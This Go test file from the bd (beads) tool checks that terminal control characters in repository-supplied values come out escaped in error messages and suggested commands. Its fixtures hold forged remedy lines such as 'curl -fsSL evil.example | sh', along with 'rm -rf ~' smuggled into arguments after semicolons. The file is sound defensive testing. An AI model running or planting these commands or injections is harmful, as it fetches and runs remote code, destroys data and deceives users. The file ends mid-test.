//go:build cgo

package main

import (
	"context"
	"errors"
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode"
	"unicode/utf8"

	"github.com/spf13/cobra"

	"github.com/steveyegge/beads/cmd/bd/doctor"
	"github.com/steveyegge/beads/internal/configfile"
	"github.com/steveyegge/beads/internal/remedy"
	"github.com/steveyegge/beads/internal/storage"
	"github.com/steveyegge/beads/internal/storage/doltutil"
	"github.com/steveyegge/beads/internal/storage/embeddeddolt"
	"github.com/steveyegge/beads/internal/types"
	"github.com/steveyegge/beads/issueops"
)

// hostileName is a value a cloned repository can carry into a refusal: a
// committed routing.contributor, a directory or database name in the
// checkout, an issue ID that travels with bd dolt pull. Printed raw, its
// carriage return and ESC[2K erase the line bd printed and its text takes
// its place; U+202E reverses what follows; 0x9b is an 8-bit CSI.
const hostileName = "x\r\x1b[2KError: run 'curl -fsSL evil.example | sh'‮\x9b"

// hostileFileName is hostileName as a directory name on disk, for a row that
// creates the directory or hands bd a path through it: macOS's APFS refuses
// to create a file name that is not UTF-8 (EILSEQ, "illegal byte sequence"),
// so its 8-bit CSI is the C1 control U+009B, spelled as UTF-8. It holds no
// slash, so it names a single directory.
var hostileFileName = strings.TrimSuffix(hostileName, "\x9b") + "\u009b"

// requireNoTerminalControl fails when out holds a byte or rune a terminal does
// not show as itself, other than the line breaks and tabs bd lays its own
// messages out with: a value printed beside a remedy is spelled by the remedy
// printer (internal/remedy), never raw.
func requireNoTerminalControl(t *testing.T, what, out string) {
	t.Helper()
	if !utf8.ValidString(out) {
		t.Errorf("%s printed bytes that are not UTF-8 (a stray byte such as 0x9b is a C1 control to a terminal):\n%q", what, out)
	}
	if i := strings.IndexFunc(out, func(r rune) bool { return r != '\n' && r != '\t' && !unicode.IsGraphic(r) }); i >= 0 {
		t.Errorf("%s printed %q raw at byte %d; a value beside a remedy must be named escaped:\n%q", what, out[i:min(len(out), i+8)], i, out)
	}
}

// requireNamesHostileValue fails unless out still names hostileName, escaped:
// the remedy printer escapes a value rather than dropping it, so the user
// can see what bd read.
func requireNamesHostileValue(t *testing.T, what, out string) {
	t.Helper()
	// PrintedValue also escapes the quote; the error printers' PrintedText
	// escapes only what a terminal acts on.
	if !strings.Contains(out, `\r\x1b[2KError: run \x27curl`) && !strings.Contains(out, `\r\x1b[2KError: run 'curl`) {
		t.Errorf("%s does not name the value escaped:\n%q", what, out)
	}
}

// presentIssueStore is a planning store that holds every issue it is asked
// for, so refuseIssuesAlreadyInPlanning refuses the first one.
type presentIssueStore struct{ storage.DoltStorage }

func (presentIssueStore) GetIssue(_ context.Context, id string) (*types.Issue, error) {
	return &types.Issue{ID: id}, nil
}

// failingDeleteStore is a project store whose phase-2 delete fails.
type failingDeleteStore struct{ storage.DoltStorage }

func (failingDeleteStore) DeleteIssues(context.Context, []string, bool, bool, bool) (*types.DeleteIssuesResult, error) {
	return nil, errors.New("database is read only")
}

// failingCreateStore is a planning store that refuses every issue it is
// asked to create.
type failingCreateStore struct{ storage.DoltStorage }

func (failingCreateStore) CreateIssue(context.Context, *types.Issue, string) error {
	return errors.New("database is read only")
}

// failingLabelsStore is a project store that cannot read an issue's labels.
type failingLabelsStore struct{ storage.DoltStorage }

func (failingLabelsStore) GetLabels(context.Context, string) ([]string, error) {
	return nil, errors.New("database is read only")
}

// dirtyStatusStore is a target store whose working set holds changes to
// tables named tables.
type dirtyStatusStore struct {
	storage.DoltStorage
	tables []string
}

func (s dirtyStatusStore) Status(context.Context) (*storage.Status, error) {
	status := &storage.Status{}
	for _, table := range s.tables {
		status.Unstaged = append(status.Unstaged, storage.StatusEntry{Table: table})
	}
	return status, nil
}

// TestRemedyRefusalsNameValuesEscaped pins the remedy-printing invariant at
// each bd migrate-personal and routed bd create refusal that names a path,
// database, table or issue ID beside its remedy: a value a cloned repository
// supplies is named escaped, so it cannot redraw the remedy. Each row is one
// entry point; a refusal added later that prints such a value raw needs a row
// here, and TestRemedyRefusalsDoNotInterpolateRawPaths catches one that
// formats a path variable without the printer.
func TestRemedyRefusalsNameValuesEscaped(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	ctx := context.Background()
	hostileRepo := func(t *testing.T) string {
		t.Helper()
		repo := filepath.Join(t.TempDir(), hostileFileName)
		if err := os.MkdirAll(filepath.Join(repo, ".beads"), 0o750); err != nil {
			t.Fatal(err)
		}
		return repo
	}
	for _, tc := range []struct {
		name string
		// refusal returns the entry point's error for hostile input.
		refusal func(t *testing.T) error
		// namesValue is whether the refusal names hostileName itself (escaped),
		// rather than only a path under it.
		namesValue bool
	}{
		{"redirectedPlanningRepoError", func(t *testing.T) error {
			return redirectedPlanningRepoError(filepath.Join("/p", hostileName, ".beads"), filepath.Join("/t", hostileName, ".beads"), "")
		}, true},
		{"stubDatabaseRefusal", func(t *testing.T) error {
			return stubDatabaseRefusal("/p/"+hostileName, "/t/"+hostileName, "db")
		}, true},
		{"refuseSelfPlanningRepo own workspace", func(t *testing.T) error {
			beadsDir := filepath.Join(t.TempDir(), ".beads")
			if err := os.MkdirAll(beadsDir, 0o750); err != nil {
				t.Fatal(err)
			}
			return refuseSelfPlanningRepo("/p/"+hostileName, beadsDir, beadsDir)
		}, true},
		{"refuseSelfPlanningRepo shared project_id", func(t *testing.T) error {
			metadata := []byte(`{"database":"dolt","backend":"dolt","project_id":"` + "id\\r\\u001b[2K" + `"}`)
			var dirs []string
			for range 2 {
				beadsDir := filepath.Join(t.TempDir(), ".beads")
				if err := os.MkdirAll(beadsDir, 0o750); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), metadata, 0o600); err != nil {
					t.Fatal(err)
				}
				dirs = append(dirs, beadsDir)
			}
			return refuseSelfPlanningRepo("/p/"+hostileName, dirs[0], dirs[1])
		}, true},
		{"planningOpenError", func(t *testing.T) error {
			return planningOpenError("/p/"+hostileName, errors.New("disk full"))
		}, true},
		{"refuseIssuesAlreadyInPlanning", func(t *testing.T) error {
			return refuseIssuesAlreadyInPlanning(ctx, presentIssueStore{}, []*types.Issue{{ID: "mp-1" + hostileName}}, "/p/"+hostileName)
		}, true},
		{"deleteMovedIssues", func(t *testing.T) error {
			saveStorageMode(t)
			return deleteMovedIssues(ctx, failingDeleteStore{}, []string{"mp-1"}, "/p/"+hostileName)
		}, true},
		{"refuseUninitializableTarget several databases", func(t *testing.T) error {
			repo := t.TempDir()
			for _, database := range []string{"beads", hostileFileName} {
				marker := filepath.Join(repo, ".beads", "embeddeddolt", database, ".dolt")
				if err := os.MkdirAll(marker, 0o750); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(filepath.Join(marker, "config.json"), []byte("{}"), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			return refuseUninitializableTarget(filepath.Join(repo, ".beads"))
		}, true},
		{"refuseUncommittedTargetChanges", func(t *testing.T) error {
			saveStorageMode(t)
			return refuseUncommittedTargetChanges(ctx, dirtyStatusStore{tables: []string{"issues", hostileName}}, filepath.Join(hostileRepo(t), ".beads"), "beads")
		}, true},
		{"copyIssuesToPlanning", func(t *testing.T) error {
			_, err := copyIssuesToPlanning(ctx, nil, failingCreateStore{}, []*types.Issue{{ID: "mp-1" + hostileName}}, "me")
			return err
		}, true},
		{"copyIssueRelations", func(t *testing.T) error {
			return copyIssueRelations(ctx, failingLabelsStore{}, nil, &types.Issue{ID: "mp-1" + hostileName}, "me")
		}, true},
		{"openDryRunTargetStore not initialized", func(t *testing.T) error {
			_, err := openDryRunTargetStore(ctx, hostileRepo(t))
			return err
		}, true},
		{"ensureBeadsDirForPath relative --repo", func(t *testing.T) error {
			return ensureBeadsDirForPath(ctx, filepath.Join(t.TempDir(), hostileFileName), nil, false)
		}, true},
		{"adoptTargetDatabase open failure", func(t *testing.T) error {
			// A .beads that is a file: the database there cannot be opened.
			beadsDir := filepath.Join(hostileRepo(t), "file", ".beads")
			if err := os.MkdirAll(filepath.Dir(beadsDir), 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(beadsDir, nil, 0o600); err != nil {
				t.Fatal(err)
			}
			return adoptTargetDatabase(ctx, beadsDir, "db"+hostileName, nil, nil)
		}, true},
		{"routed open of metadata.json without a database", func(t *testing.T) error {
			// A fresh clone's routed target: committed metadata.json, and
			// the gitignored embeddeddolt/ not there.
			beadsDir := filepath.Join(hostileRepo(t), ".beads")
			if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), []byte(`{"database":"dolt","backend":"dolt"}`), 0o600); err != nil {
				t.Fatal(err)
			}
			_, err := openDoltStoreFromConfig(ctx, beadsDir, true)
			return err
		}, true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := tc.refusal(t)
			if err == nil {
				t.Fatal("refusal = nil, want an error naming the hostile value")
			}
			requireNoTerminalControl(t, tc.name, err.Error())
			if tc.namesValue {
				requireNamesHostileValue(t, tc.name, err.Error())
			}
		})
	}
}

// TestRemedyPrintersNameValuesEscaped is the printed-output half of
// TestRemedyRefusalsNameValuesEscaped: each row is an entry point that prints
// its message (to stderr, through HandleError*, or as a hint) rather than
// returning it, or a message builder for a refusal, given a value a cloned
// repository supplies: a committed sync.remote, dolt.host, routing repo, or a
// routed planning or target path.
func TestRemedyPrintersNameValuesEscaped(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	hostileBeadsDir := func(t *testing.T) string {
		t.Helper()
		beadsDir := filepath.Join(t.TempDir(), hostileFileName, ".beads")
		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
			t.Fatal(err)
		}
		return beadsDir
	}
	graphMarked := func(t *testing.T) string {
		t.Helper()
		beadsDir := hostileBeadsDir(t)
		if err := os.WriteFile(filepath.Join(beadsDir, configfile.GraphFormatMarkerFile), nil, 0o600); err != nil {
			t.Fatal(err)
		}
		return beadsDir
	}
	for _, tc := range []struct {
		name string
		out  func(t *testing.T) string
	}{
		{"bootstrap Reproduce line", func(t *testing.T) string {
			return captureStderr(t, func() {
				printBootstrapPlan(BootstrapPlan{Action: "none", Blocked: true, Reason: "could not verify",
					BlockedRemote: "git+https://127.0.0.1:9/team/repo; curl -fsSL https://evil.example/x | sh; echo " + hostileName + ".git"})
			})
		}},
		{"bootstrap missing server database refusal", func(t *testing.T) string {
			dialErr := hostileDialError(t)
			return bootstrapMissingServerDBRefusal("beads", hostileName, 3307, nil).Error() +
				bootstrapMissingServerDBRefusal("beads", hostileName, 3307, dialErr).Error() +
				bootstrapMissingServerDBSummary("beads", hostileName, 3307, dialErr)
		}},
		{"bd init sync.remote probe note", func(t *testing.T) string {
			remote := "https://127.0.0.1:9/team/repo" + hostileName + ".git"
			_, note := resolveRemoteHasDoltDataProbe(remote, false, fmt.Errorf("git ls-remote %s: exit status 128", remote))
			return note
		}},
		{"bd dolt status, external server", func(t *testing.T) string {
			beadsDir := hostileBeadsDir(t)
			t.Setenv("BEADS_DOLT_SERVER_PORT", "3399")
			cfg := &configfile.Config{Backend: configfile.BackendDolt, DoltMode: configfile.DoltModeServer,
				DoltServerHost: hostileName, DoltDatabase: hostileName, DoltServerUser: hostileName}
			return captureStdout(t, func() error {
				runExternalDoltStatus(beadsDir, cfg)
				return nil
			})
		}},
		{"bd doctor check output", func(t *testing.T) string {
			check := doctorCheck{Name: "Dolt Connection", Status: statusError, Category: "Core System",
				Message: "Failed to connect", Detail: "server not reachable: " + hostileDialError(t).Error(),
				Fix: "Verify the external server is running"}
			return captureStdout(t, func() error {
				printDiagnostics(doctorResult{Checks: []doctorCheck{check}}, doctor.FixGate{})
				return nil
			})
		}},
		{"bd doctor --server check output", func(t *testing.T) string {
			check := doctor.DoctorCheck{Name: "Server Reachable", Status: statusError,
				Message: "Cannot connect", Detail: hostileDialError(t).Error()}
			return captureStdout(t, func() error {
				printServerHealthResult(doctor.ServerHealthResult{Checks: []doctor.DoctorCheck{check}})
				return nil
			})
		}},
		{"bd init guard, missing server database", func(t *testing.T) string {
			return initGuardMissingServerDBMessage("beads", hostileName, 3307, "", true).Error()
		}},
		{"bd init guard, server message", func(t *testing.T) string {
			return initGuardServerMessage("beads", hostileName, 3307, "bd", "").Error() +
				initGuardServerMessage("beads", "db", 3307, "bd", "git+https://example.com/r.git"+hostileName).Error()
		}},
		{"migrate-personal planning repo in a graph format", func(t *testing.T) string {
			beadsDir := graphMarked(t)
			return captureStderr(t, func() {
				_ = planningOpenError(filepath.Dir(beadsDir), checkDiscoveredForOpen(beadsDir))
			})
		}},
		{"bd create --repo target in a graph format", func(t *testing.T) string {
			beadsDir := graphMarked(t)
			return captureStderr(t, func() {
				_ = handleRepoTargetInitError(filepath.Dir(beadsDir), checkRepoTargetFormat(filepath.Dir(beadsDir)))
			})
		}},
		{"bd create --repo target store open failure", func(t *testing.T) string {
			beadsDir := hostileBeadsDir(t)
			if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), []byte(`{"database":"dolt","backend":"dolt"}`), 0o600); err != nil {
				t.Fatal(err)
			}
			_, openErr := openDoltStoreFromConfig(context.Background(), beadsDir, true)
			return captureStderr(t, func() {
				_ = handleCreateTargetStoreError(openErr, filepath.Dir(beadsDir), "failed to open target store: %v")
			})
		}},
		{"unreadable version witness warning", func(t *testing.T) string {
			var buf strings.Builder
			previous := legacyUpgradeWarnWriter
			legacyUpgradeWarnWriter = &buf
			t.Cleanup(func() { legacyUpgradeWarnWriter = previous })
			warnUnreadableVersionWitness(hostileBeadsDir(t), "garbage")
			return buf.String()
		}},
		{"bd mol distill formula directory hint", func(t *testing.T) string {
			return formulaDirHint([]string{filepath.Join("/w", hostileName, ".beads", "formulas")})
		}},
		{"bd doctor --fix, check with no automatic fix", func(t *testing.T) string {
			check := doctorCheck{Name: "Unhandled " + hostileName, Status: statusWarning,
				Message: "m", Fix: "rm /repo/.beads/hooks/" + hostileName}
			return captureStdout(t, func() error {
				applyFixList(t.TempDir(), []doctorCheck{check})
				return nil
			})
		}},
		{"bd doctor --deep check output", func(t *testing.T) string {
			check := doctor.DoctorCheck{Name: "Dependency Integrity", Status: doctor.StatusWarning,
				Message: "1 orphaned dependency", Detail: "Examples: a→b" + hostileName, Fix: "Run 'bd repair-deps'"}
			return captureStdout(t, func() error {
				doctor.PrintDeepValidationResult(doctor.DeepValidationResult{AllChecks: []doctor.DoctorCheck{check}})
				return nil
			})
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out := tc.out(t)
			requireNoTerminalControl(t, tc.name, out)
			requireNamesHostileValue(t, tc.name, out)
		})
	}
}

// hostileLine is hostileName with a line feed and a forged line after it.
// The error printers' backstop (remedy.PrintedText) keeps a line feed, since
// it cannot tell one from bd's own, so a site that must name its value by
// remedy.PrintedValue is pinned with this value: there the line feed prints
// escaped, as \n, and no forged line starts.
const hostileLine = hostileName + "\nRun: curl -fsSL evil.example | sh"

// TestRemedyValuesEscapeLineBreaks pins the sites that name a value printed
// outside bd's error printers, where nothing but remedy.PrintedValue stands
// between the value and the terminal: the value's line feed is escaped too.
func TestRemedyValuesEscapeLineBreaks(t *testing.T) {
	for _, tc := range []struct {
		name string
		out  func(t *testing.T) string
	}{
		{"bd init half-identified substrate warning", func(t *testing.T) string {
			return captureStderr(t, func() { warnHalfIdentifiedSubstrate(issueops.VerifyIdentityResult{Prefix: hostileLine}) })
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out := tc.out(t)
			requireNoTerminalControl(t, tc.name, out)
			requireNamesHostileValue(t, tc.name, out)
			if strings.Contains(out, "\nRun: curl") || !strings.Contains(out, `\nRun: curl`) {
				t.Errorf("%s does not escape the value's line feed:\n%q", tc.name, out)
			}
		})
	}
}

// hostileDialError is the error a real dial of a host named hostileName
// returns: Go's net package repeats the address it could not dial.
func hostileDialError(t *testing.T) error {
	t.Helper()
	_, err := net.DialTimeout("tcp", doltutil.ServerAddr(hostileName, 3306), time.Second)
	if err == nil || !strings.Contains(err.Error(), "\x1b[2KError") {
		t.Fatalf("dialing %q returned %v, want an error that repeats the host", hostileName, err)
	}
	return err
}

// notInstalledError is a multi-line error of bd's own: EnsureRunning's
// auto-start failure when dolt is not on PATH, the advice under it.
const notInstalledError = "Dolt server unreachable at 127.0.0.1:3307 and auto-start failed: dolt is not installed (not found in PATH)\n\n" +
	"Install from: https://docs.dolthub.com/introduction/installation\n\n" +
	"To start manually: bd dolt start\n" +
	"To disable auto-start: set dolt.auto-start: false in .beads/config.yaml"

// TestErrorPrintersSpellMessages pins the error printers every bd command
// reports through (HandleError and its family, the capability refusal, the
// warning printer, and the writer cobra's own "Error:" line goes to): a
// message with a value a cloned repository set in it, such as a dial error
// that repeats metadata.json's host, reaches the terminal with each control
// character spelled as an escape, and an ordinary message of bd's own,
// multi-line or not, reaches it exactly as written.
func TestErrorPrintersSpellMessages(t *testing.T) {
	printers := []struct {
		name  string
		print func(msg string) string
	}{
		{"HandleError", func(msg string) string {
			return captureStderr(t, func() { _ = HandleError("%v", errors.New(msg)) })
		}},
		{"HandleErrorRespectJSON", func(msg string) string {
			return captureStderr(t, func() { _ = HandleErrorRespectJSON("failed: %s", msg) })
		}},
		{"HandleErrorWithHint", func(msg string) string {
			return captureStderr(t, func() { _ = HandleErrorWithHint(msg, "hint: "+msg) })
		}},
		{"HandleErrorWithHintRespectJSON", func(msg string) string {
			return captureStderr(t, func() { _ = HandleErrorWithHintRespectJSON(msg, "hint") })
		}},
		{"HandleProxyCapabilityError", func(msg string) string {
			return captureStderr(t, func() { _ = HandleProxyCapabilityError(&ProxyCapabilityError{Message: msg, Code: "x"}) })
		}},
		{"WarnError", func(msg string) string {
			return captureStderr(t, func() { WarnError("%s", msg) })
		}},
		{"cobra error line", func(msg string) string {
			var buf strings.Builder
			cmd := &cobra.Command{Use: "probe", SilenceUsage: true, RunE: func(*cobra.Command, []string) error { return errors.New(msg) }}
			cmd.SetErr(remedy.TextWriter(&buf))
			cmd.SetArgs(nil)
			_ = cmd.Execute()
			return buf.String()
		}},
	}
	for _, p := range printers {
		t.Run(p.name, func(t *testing.T) {
			hostile := "failed to open routed store at /tmp/plan" + hostileName + ": " + hostileDialError(t).Error()
			out := p.print(hostile)
			requireNoTerminalControl(t, p.name, out)
			if !strings.Contains(out, `/tmp/planx\r\x1b[2KError: run 'curl`) {
				t.Errorf("%s does not name the value escaped:\n%q", p.name, out)
			}
			if out := p.print(notInstalledError); !strings.Contains(out, notInstalledError) {
				t.Errorf("%s does not print bd's own multi-line message as written:\n%s", p.name, out)
			}
		})
	}
}

// TestPasteReadyCommandsQuoteValues pins these paste-ready commands
// that take a value from config, the repository or the command line: each
// value goes in as one shell word (quoted when it holds a space or a shell
// character), or as a placeholder named escaped after the command, never
// bare.
func TestPasteReadyCommandsQuoteValues(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the rows spell the POSIX quoting")
	}
	effect := func(key, value string) string {
		var out []string
		for _, e := range checkConfigSetSideEffects(key, value) {
			out = append(out, e.Message, e.Command)
		}
		return strings.Join(out, "\n")
	}
	for _, tc := range []struct {
		name, out string
		want      []string
	}{
		{"federation.remote side effect", effect("federation.remote", "https://x.example/db; curl evil | sh"),
			[]string{"bd dolt remote add origin 'https://x.example/db; curl evil | sh'"}},
		{"federation.remote side effect, hostile", effect("federation.remote", "https://x.example/"+hostileName),
			[]string{"bd dolt remote add origin <url>  (<url>: "}},
		{"sync.git-remote side effect", effect("sync.git-remote", "my remote"),
			[]string{"git remote -v | grep 'my remote'"}},
		{"bd ship hint", shipCommand("cap; rm -rf ~"), []string{"`bd ship 'cap; rm -rf ~'`"}},
		{"bd mol wisp hint", captureStderr(t, func() { warnPourVaporFormula("my formula", []string{"title=a b", "x=" + hostileName}) }),
			[]string{"bd mol wisp 'my formula' --var 'title=a b' --var <var2>  (<var2>: "}},
		{"bd mol pour hint (bd cook --persist)", captureStdout(t, func() error { printCookedProto("rel; x", 2, nil, nil); return nil }),
			[]string{"To use: bd mol pour 'rel; x' --var <name>=<value>"}},
		{"bd mol pour hint (bd cook --persist), hostile", captureStdout(t, func() error { printCookedProto(hostileName, 2, nil, []string{hostileName}); return nil }),
			[]string{"To use: bd mol pour <proto> --var <name>=<value>  (<proto>: "}},
		{"bd ship missing export label hint", labelAddCommand("export:cap; rm -rf ~"),
			[]string{"bd label add <issue-id> 'export:cap; rm -rf ~'"}},
		{"bd ship missing export label hint, hostile", labelAddCommand("export:" + hostileName),
			[]string{"bd label add <issue-id> <label>  (<label>: "}},
		{"proxied restore teardown hint", proxiedRestoreFailureMessage("/home/me/my backups", false, &proxiedTeardownError{err: errors.New("boom")}),
			[]string{"then `bd backup init '/home/me/my backups'` to re-register"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			requireNoTerminalControl(t, tc.name, tc.out)
			for _, want := range tc.want {
				if !strings.Contains(tc.out, want) {
					t.Errorf("%s = %q, want it to hold %q", tc.name, tc.out, want)
				}
			}
		})
	}
}

// TestRemedyPrintersKeepBdsOwnLines pins the routed open and create
// refusals that wrap an error bd composed (a server-mode open's auto-start
// failure, with its advice on lines of its own): the wrapped error is
// reported line for line, not quoted onto one line.
func TestRemedyPrintersKeepBdsOwnLines(t *testing.T) {
	cause := errors.New(notInstalledError)
	for _, tc := range []struct {
		name string
		out  func() string
	}{
		{"bd create --repo target store open failure", func() string {
			return captureStderr(t, func() {
				_ = handleCreateTargetStoreError(cause, "/tmp/target", "failed to open target store: %v")
			})
		}},
		{"bd create --repo target initialization failure", func() string {
			return captureStderr(t, func() { _ = handleRepoTargetInitError("/tmp/target", cause) })
		}},
		{"bd migrate-personal planning store open failure", func() string {
			return planningOpenError("/tmp/planning", cause).Error()
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if out := tc.out(); !strings.Contains(out, notInstalledError) {
				t.Errorf("the open error is not reported as bd wrote it:\n%s", out)
			}
		})
	}
}

// TestCreateTargetMessagesQuoteOrdinaryPaths pins that a routed bd create's
// capability refusals name an ordinary target path in double quotes, as main
// spelled it with %q, while still escaping what a terminal acts on.
func TestCreateTargetMessagesQuoteOrdinaryPaths(t *testing.T) {
	for _, code := range []string{"proxy.store.refused", "proxy.store.unrouted"} {
		t.Run(code, func(t *testing.T) {
			out := captureStderr(t, func() {
				_ = handleCreateTargetStoreError(&ProxyCapabilityError{Code: code, Message: "refused"}, "/home/me/my repo", "%v")
			})
			if !strings.Contains(out, `create target "/home/me/my repo"`) {
				t.Errorf("the target path is not named in double quotes:\n%s", out)
			}
		})
	}
}

// remedyGuardedFuncs names, per file, the functions whose messages name a
// clone-supplied path, database, table or issue ID beside a remedy: every
// function of migrate_personal.go, and the routed-create target functions of
// create.go. "*" is every function in the file.
var remedyGuardedFuncs = map[string][]string{
	"migrate_personal.go": {"*"},
	"create.go": {
		"handleCreateTargetStoreError", "openDryRunTargetStore", "handleRepoTargetInitError",
		"ensureBeadsDirForPath", "refuseUninitializableTarget", "serverInitRemedy",
		"adoptTargetDatabase", "refuseUncommittedTargetChanges",
	},
	// The open of a routed planning or target store (bd migrate-personal,
	// bd create --repo, auto-routing).
	"store_factory.go":          {"openDoltStoreFromConfig", "errNoRoutedEmbeddedDatabase"},
	"workspace_format_guard.go": {"handleWorkspaceGuardError"},
}

// remedyTaintedNames are the variables and fields those functions hold a
// clone-supplied value in, and remedyTaintedCalls the calls that derive or
// read one.
var (
	remedyTaintedNames = map[string]bool{
		"planningPath": true, "planningRaw": true, "planningRepo": true, "planningBeadsDir": true,
		"targetRepo": true, "target": true, "targetPath": true, "repoPath": true,
		"beadsDir": true, "repo": true, "where": true, "host": true,
		"tables": true, "databases": true, "created": true, "ids": true,
		"ID": true, "SourceRepo": true, "ProjectID": true, "TargetDir": true,
	}
	remedyTaintedCalls = map[string]bool{
		"filepath.Dir": true, "filepath.Join": true, "filepath.Base": true,
		"strings.Join": true, "embeddeddolt.Databases": true,
		"configfile.ConfigPath": true, "configfile.MetadataFilePath": true,
	}
	// remedyPrintCalls are the calls whose arguments reach the terminal.
	remedyPrintCalls = map[string]bool{
		"fmt.Errorf": true, "fmt.Sprintf": true, "fmt.Printf": true, "fmt.Fprintf": true,
		"fmt.Println": true, "fmt.Fprintln": true, "refusePlanningRepo": true, "refuseTarget": true,
		"HandleError": true, "HandleErrorRespectJSON": true, "HandleErrorWithHint": true,
	}
)

// TestRemedyRefusalsDoNotInterpolateRawPaths is the census half of the
// remedy-printing invariant (TestRemedyRefusalsNameValuesEscaped is the
// behavioral half): in the guarded functions, a clone-supplied value reaches
// a print call only through the remedy printer (a remedy.* call), or through
// a variable that function assigned from one. %q is rejected too, so every
// guarded site goes through the one printer. This test does not check which
// remedy call a site uses: a value that may be pasted is protected by
// CommandArg or EscapedValue, not by PrintedValue, which prints a printable
// value bare. A new refusal that formats planningPath, a target path, a
// database list or an issue ID bare fails here.
func TestRemedyRefusalsDoNotInterpolateRawPaths(t *testing.T) {
	t.Parallel()
	callName := func(call *ast.CallExpr) string {
		switch fn := call.Fun.(type) {
		case *ast.Ident:
			return fn.Name
		case *ast.SelectorExpr:
			if pkg, ok := fn.X.(*ast.Ident); ok {
				return pkg.Name + "." + fn.Sel.Name
			}
		}
		return ""
	}
	isRemedyCall := func(n ast.Node) bool {
		call, ok := n.(*ast.CallExpr)
		return ok && strings.HasPrefix(callName(call), "remedy.")
	}
	for file, funcs := range remedyGuardedFuncs {
		fset := token.NewFileSet()
		parsed, err := parser.ParseFile(fset, file, nil, 0)
		if err != nil {
			t.Fatalf("parse %s: %v", file, err)
		}
		seen := map[string]bool{}
		for _, decl := range parsed.Decls {
			fn, ok := decl.(*ast.FuncDecl)
			if !ok || fn.Body == nil || (funcs[0] != "*" && !slices.Contains(funcs, fn.Name.Name)) {
				continue
			}
			seen[fn.Name.Name] = true
			// printed holds the variables this function assigns only from the
			// printer, or from a print call whose own arguments are checked.
			printed := map[string]bool{}
			ast.Inspect(fn.Body, func(n ast.Node) bool {
				assign, ok := n.(*ast.AssignStmt)
				if !ok {
					return true
				}
				for i, lhs := range assign.Lhs {
					ident, ok := lhs.(*ast.Ident)
					if !ok || i >= len(assign.Rhs) {
						continue
					}
					call, isCall := assign.Rhs[i].(*ast.CallExpr)
					if isCall && (isRemedyCall(call) || remedyPrintCalls[callName(call)]) {
						if _, seenBefore := printed[ident.Name]; !seenBefore {
							printed[ident.Name] = true
						}
						continue
					}
					printed[ident.Name] = false
				}
				return true
			})
			ast.Inspect(fn.Body, func(n ast.Node) bool {
				call, ok := n.(*ast.CallExpr)
				if !ok || !remedyPrintCalls[callName(call)] {
					return true
				}
				for _, arg := range call.Args {
					ast.Inspect(arg, func(n ast.Node) bool {
						if isRemedyCall(n) {
							return false
						}
						var name string
						switch x := n.(type) {
						case *ast.CallExpr:
							name := callName(x)
							if remedyTaintedCalls[name] {
								t.Errorf("%s: %s formats %s without the remedy printer (internal/remedy)", fset.Position(x.Pos()), fn.Name.Name, name)
								return false
							}
							// A ui render wrapper prints its argument; any
							// other call computes a value of its own (a
							// count, a port), and a nested print call is
							// checked on its own.
							return strings.HasPrefix(name, "ui.")
						case *ast.SelectorExpr:
							name = x.Sel.Name
						case *ast.Ident:
							name = x.Name
						default:
							return true
						}
						if remedyTaintedNames[name] && !printed[name] {
							t.Errorf("%s: %s formats %s without the remedy printer (internal/remedy)", fset.Position(n.Pos()), fn.Name.Name, name)
							return false
						}
						return true
					})
				}
				return true
			})
		}
		for _, name := range funcs {
			if name != "*" && !seen[name] {
				t.Errorf("%s has no function %s; update remedyGuardedFuncs", file, name)
			}
		}
	}
}

// hostilePlanningRepo makes an initialized planning repo whose directory name
// is hostileFileName and points dir's routing.contributor at it, as a
// committed config.yaml can.
func hostilePlanningRepo(t *testing.T, bd, dir string) string {
	t.Helper()
	planningDir := filepath.Join(t.TempDir(), hostileFileName)
	if err := os.MkdirAll(planningDir, 0o750); err != nil {
		t.Fatal(err)
	}
	initGitRepoAt(t, planningDir)
	runBDInit(t, bd, planningDir, "--prefix", "pl")
	for _, kv := range [][2]string{{"routing.contributor", planningDir}, {"routing.mode", "auto"}} {
		if out, err := bdRunWithFlockRetry(t, bd, dir, "config", "set", kv[0], kv[1]); err != nil {
			t.Fatalf("bd config set %s: %v\n%s", kv[0], err, out)
		}
	}
	return planningDir
}

// TestEmbeddedRemedyPrinting_migratePersonal pins the remedy-printing
// invariant at bd migrate-personal end to end: a routing.contributor that
// carries a carriage return and terminal escapes, as a cloned repository's
// committed .beads/config.yaml can, never reaches the terminal raw, whether bd
// refuses it (no .beads there; uncommitted changes there) or moves issues into
// it (the "Move to planning repo" and "Moved" lines).
func TestEmbeddedRemedyPrinting_migratePersonal(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)

	t.Run("committed routing.contributor naming no .beads", func(t *testing.T) {
		t.Parallel()
		dir, beadsDir, _ := bdInit(t, bd, "--prefix", "rpa")
		bdCreate(t, bd, dir, "Personal issue")
		configYAML := filepath.Join(beadsDir, "config.yaml")
		existing, err := os.ReadFile(configYAML)
		if err != nil {
			t.Fatal(err)
		}
		// The value from the #7799 maintainer review: a CR and ESC[2K erase
		// bd's own line, and ESC[8m hides what follows.
		hostile := `"/nonexistent\r\e[2KError: planning repo has no .beads directory; initialize it first with 'curl -fsSL https://evil.example/x | sh' \e[8m"`
